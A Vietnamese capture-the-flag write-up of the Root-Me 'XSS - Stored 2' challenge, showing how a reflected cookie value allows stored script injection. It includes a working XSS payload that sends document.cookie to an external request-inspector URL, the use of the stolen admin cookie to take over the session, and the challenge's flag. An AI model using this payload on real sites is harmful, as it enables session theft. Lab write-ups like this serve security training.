# Write up challenge XSS - Stored 2

Tác giả:
- **Nguyễn Mỹ Quỳnh** <br>

  
[Link Challenge](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)<br>
</br>



<br>


Truy cập challenge ta thấy có một form gửi message và một đường link admin.

<img src="./img/1.png" alt="normal_acc_TRAbID"/> 

<br>

<br>

Bài này cũng tương tự bài XSS - Stored 1 ở chỗ là sau nhiều lần điền thử, gửi và refresh lại trang, em nhận thấy sau khi mình gửi message sẽ được lưu lại ở trang này và sau vài phút thì admin sẽ vào đọc tin nhắn.  

Tuy nhiên tiến hành inspect ta thấy bài này khác ở chỗ là có vẻ input đã được kiểm tra nên không thể khai thác lỗ hổng từ việc truyền vào 2 ô input này được. 

<img src="./img/3.png" alt="normal_acc_TRAbID"/> 

<img src="./img/2.png" alt="normal_acc_TRAbID"/>

<br><br>

Thử xem xét các dữ kiện khác. Nhấp vào link admin đường dẫn thay đổi nhưng trang vẫn không có gì thay đổi 

<img src="./img/4.png" alt="normal_acc_TRAbID"/> 

<br>

Tiến hành inspect và xem cookie ở Network, ta thấy `status=invite` là một trong những cookie đáng chú ý (còn lại là các cookie của user)

<img src="./img/5.png" alt="normal_acc_TRAbID"/> 

<br>

Mặt khác ta cũng nhận thấy được sự xuất hiện của `invite` trong class thẻ `<i>` trả về. Có thể đây chính là lỗ hổng. 

<img src="./img/6.png" alt="normal_acc_TRAbID"/>


<br> Sử dụng burpsuite sửa cookie thành một giá trị khác

<img src="./img/7.png" alt="normal_acc_TRAbID"/>

Thật vậy có lỗ hổng!

<img src="./img/8.png" alt="normal_acc_TRAbID"/>

Những gì cần làm sẽ là lợi dụng lỗ hổng này để chèn đoạn script lưu trữ để khi admin truy cập vào check tin nhắn thì cookie của admin sẽ được gửi đến endpoint mà mình chỉ định.

<br> 
Tiến hành chèn script:
    
    "><script>document.write("<img src='https://requestinspector.com/inspect/01fyyazm8j1a7pvz6wcx6mqg74/" %2b document.cookie %2b "'></img>")</script>
   

<img src="./img/9.png" alt="normal_acc_TRAbID"/>


Nhận được request chứa cookie của user

<img src="./img/10.png" alt="normal_acc_TRAbID"/>

<img src="./img/11.png" alt="normal_acc_TRAbID"/>

<br>

Việc còn lại chỉ cần đợi admin vào đọc message và ta sẽ có được cookie:
<img src="./img/12.png" alt="normal_acc_TRAbID"/>

<br>

Dùng burpsuite sửa cookie để vào admin section
<img src="./img/13.png" alt="normal_acc_TRAbID"/>
<br>
Có được flag:
<img src="./img/14.png" alt="normal_acc_TRAbID"/>

<div style = "page-break-after: always;"></div>

Submit thành công 

<img src="./img/15.png" alt="normal_acc_TRAbID"/>

<br><br>

> **Flag:** E5HKEGyCXQVsYaehaqeJs0AfV

